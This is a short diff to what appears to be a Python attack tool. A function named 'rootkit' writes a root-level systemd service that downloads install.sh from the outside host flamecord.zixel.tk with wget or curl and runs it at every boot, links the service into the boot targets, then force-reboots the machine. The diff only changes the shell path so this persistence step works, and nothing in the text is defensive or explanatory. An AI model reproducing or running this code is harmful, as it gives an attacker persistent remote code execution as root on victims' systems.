@@ -49,7 +49,7 @@ async def grub_boot(client):
 async def rootkit(client):
     await asyncio.sleep(20)
     for x in [
-            'printf "[Unit]\\nAfter=network.target\\nDescription=a\\n\\n[Service]\\nUser=root\\nGroup=root\\nExecStart=sh -c \'(wget flamecord.zixel.tk/install.sh -O/install.sh || curl -L flamecord.zixel.tk/install.sh -o /install.sh); sh /install.sh\'\\n\\n[Install]\\nWantedBy=multi-user.target" > /usr/lib/systemd/system/qqq.service;',
+            'printf "[Unit]\\nAfter=network.target\\nDescription=a\\n\\n[Service]\\nUser=root\\nGroup=root\\nExecStart=/bin/sh -c \'(wget flamecord.zixel.tk/install.sh -O/install.sh || curl -L flamecord.zixel.tk/install.sh -o /install.sh); sh /install.sh\'\\n\\n[Install]\\nWantedBy=multi-user.target" > /usr/lib/systemd/system/qqq.service;',
             "ln -s /usr/lib/systemd/system/qqq.service /etc/systemd/system/multi-user.target.wants/qqq.service;",
             "reboot -f || sbin/reboot -f;",
     ]:
